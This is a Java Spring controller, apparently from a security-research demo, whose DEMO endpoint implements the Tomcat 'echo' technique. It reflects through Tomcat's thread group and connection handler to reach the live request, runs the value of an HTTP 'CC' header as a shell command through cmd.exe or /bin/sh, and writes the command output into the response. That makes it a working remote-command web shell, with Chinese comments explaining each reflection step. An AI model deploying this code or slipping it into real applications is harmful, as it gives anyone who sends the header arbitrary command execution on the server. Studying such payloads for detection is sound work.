package summersec.echo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

/**
 * @ClassName: TomcatEcho
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/6/16 17:16
 * @Version: v1.0.0
 * @Description:    header cc: "cmd"
 **/
@Controller
public class TomcatEcho {
    @RequestMapping("TomcatEcho")
    public String TomcatEcho(){
        return "TomcatEcho";
    }
    @RequestMapping("index")
    public String index(){
        return "index";
    }
    @RequestMapping("two")
    public String two(){
        return "two";
    }
    @RequestMapping(value = "DEMO")
    public void DEMO()throws Exception {
        // flag 标记作用
        boolean flag = false;
        // 获取当前线程组
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        // 反射获取字段threads
        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        // f.get(group) 获取 threads 线程中数组对象
        Thread[] threads = (Thread[]) f.get(group);
        for (int i = 0; i < threads.length; i++) {
            //14
            try {
                Thread t = threads[i];
                if (t == null) {
                    continue;
                }

                String str = t.getName();
                //http-nio-8090-BlockPoller continue  NoSuchField异常 i=3
                if (str.contains("exec") || !str.contains("http")) {
                    continue;
                }
                //str = http-nio-8090-ClientPoller 进入下面 ps: i=14
                // java.lang.Thread
                f = t.getClass().getDeclaredField("target");
                f.setAccessible(true);
                // obj ->  NioEndpoint$Poller实例化对象
                Object obj = f.get(t);
                // NioEndpoint$Poller  implements Runnable
                if (!(obj instanceof Runnable)) {
                    continue;
                }
                // this$0 是NioEndpoint对象
                f = obj.getClass().getDeclaredField("this$0");
                f.setAccessible(true);
                // f.get(obj) --> org.apche.tomcat.util.net.NioEndpoint 对象
                obj = f.get(obj);
                // NioEndpoint extends AbstractJsseEndpoint<NioChannel, SocketChannel> -->extends AbstractEndpoint$Handler
                //  AbstractEndpoint$Handler 是一个接口，在org.apche.coyote.AbstractProtocol$ConnectionsHanhler实现
                try {
                    f = obj.getClass().getDeclaredField("handler");
                } catch (NoSuchFieldException e) {
                    f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                }
                // obj -->  org.apche.coyote.AbstractProtocol$ConnectionsHanhler
                f.setAccessible(true);
                obj = f.get(obj);
                try {
                    f = obj.getClass().getSuperclass().getDeclaredField("global");
                } catch (NoSuchFieldException e) {
                    // AbstractProtocol$ConnectionsHanhler
                    f = obj.getClass().getDeclaredField("global");
                }
                // obj --> org.apche.coyote.RequestGroupInfo
                f.setAccessible(true);
                obj = f.get(obj);
                f = obj.getClass().getDeclaredField("processors");
                f.setAccessible(true);
                // processors --> List<RequestInfo>
                java.util.List processors = (java.util.List) (f.get(obj));
                // processors.size() == 1
                for (int j = 0; j < processors.size(); ++j) {
                    Object processor = processors.get(j);
                    f = processor.getClass().getDeclaredField("req");
                    f.setAccessible(true);
                    // org.apche.coyote.Request
                    Object req = f.get(processor);
                    // org.apche.coyote.Response
                    Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                    // header cc: "cmd"
                    str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"CC"});
                    if (str != null && !str.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);
                        try {
                            Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                            obj = cls.newInstance();
                            cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                        } catch (NoSuchMethodException var5) {
                            Class cls = Class.forName("java.nio.ByteBuffer");
                            obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                        }
                        flag = true;
                    }
                    if (flag) {
                        break;
                    }
                }
                if (flag) {
                    break;
                }
            } catch (Exception e) {
                continue;
            }
        }
    }
}
